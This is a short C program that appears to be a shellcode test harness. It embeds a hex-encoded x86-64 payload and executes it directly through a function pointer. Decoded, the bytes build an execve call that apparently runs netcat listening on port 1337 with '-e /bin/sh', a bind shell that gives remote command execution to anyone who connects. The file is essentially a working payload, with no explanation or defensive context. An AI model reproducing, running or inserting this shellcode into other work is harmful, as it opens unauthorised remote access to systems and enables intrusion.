#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x31\xd2\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x6e\x63\x41\x57\x57\x48\x89\xe7\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x41\x57\x51\x48\x89\xe1\x48\xbb\xaa\xaa\xaa\xaa\xaa\xaa\x2d\x65\x48\xc1\xeb\x30\x53\x48\x89\xe3\x49\xba\xbb\xbb\xbb\xbb\x31\x33\x33\x37\x49\xc1\xea\x20\x41\x52\x49\x89\xe2\x49\xb9\xcc\xcc\xcc\xcc\xcc\xcc\x2d\x70\x49\xc1\xe9\x30\x41\x51\x49\x89\xe1\x49\xb8\xff\xff\xff\xff\xff\xff\x2d\x6c\x49\xc1\xe8\x30\x41\x50\x49\x89\xe0\x52\x51\x53\x41\x52\x41\x51\x41\x50\x57\x48\x89\xe6\xb0\x3c\xfe\xc8\x0f\x05";

main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	

